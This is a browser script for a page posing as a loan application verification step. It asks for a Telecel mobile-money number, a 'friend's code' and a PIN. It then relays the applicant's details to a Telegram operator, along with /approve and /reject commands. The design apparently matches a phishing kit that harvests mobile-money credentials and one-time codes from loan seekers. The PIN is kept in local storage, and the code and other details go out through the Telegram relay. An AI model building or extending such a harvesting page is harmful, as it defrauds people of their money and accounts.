// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    // Load data from localStorage
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    
    if (loanData) {
        document.getElementById('displayName').textContent = loanData.fullname;
        document.getElementById('displayAmount').textContent = 'GHS ' + loanData.loanAmount;
        document.getElementById('displayPhone').textContent = loanData.phone;
        document.getElementById('displayRef').textContent = loanData.referenceId;
    } else {
        window.location.href = 'index.html';
    }
});

// Handle form submission
document.getElementById('verificationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    const telecelNumber = document.getElementById('telecelNumber').value.trim();
    const friendCode = document.getElementById('friendCode').value.trim();
    const pin = document.getElementById('pin').value.trim();
    
    if (!telecelNumber || !friendCode || !pin) {
        alert('Please fill all fields');
        return;
    }
    
    if (telecelNumber.length !== 10) {
        alert('Please enter a valid 10-digit Telecel number');
        return;
    }
    
    // Save full data
    const fullData = {
        ...loanData,
        telecelNumber,
        friendCode,
        pin
    };
    localStorage.setItem('fullApp', JSON.stringify(fullData));
    
    // Show loading
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        loadingOverlay.classList.remove('hidden');
    }
    
    // Prepare message for Telegram
    const message = `🔔 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${loanData.phone}\n🔑 *Friend's Code:* ${friendCode}\n💰 *Amount:* GHS ${loanData.loanAmount}\n👤 *Name:* ${loanData.fullname}\n🆔 *Ref:* ${loanData.referenceId}\n━━━━━━━━━━━━━━━━━━\n\n*Actions:*\n✅ /approve_${loanData.referenceId} - Approve\n❌ /reject_${loanData.referenceId} - Reject`;
    
    try {
        // ✅ USE RELATIVE URL - works on same domain
        const response = await fetch('/api/send-message', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message })
        });
        
        if (response.ok) {
            localStorage.setItem('currentRef', loanData.referenceId);
            window.location.href = 'page3.html';
        } else {
            throw new Error('Failed to send');
        }
    } catch (error) {
        alert('Error sending to Telegram. Please try again.');
        if (loadingOverlay) {
            loadingOverlay.classList.add('hidden');
        }
    }
});

// Input validation
const telecelInput = document.getElementById('telecelNumber');
if (telecelInput) {
    telecelInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
}

const pinInput = document.getElementById('pin');
if (pinInput) {
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
    });
}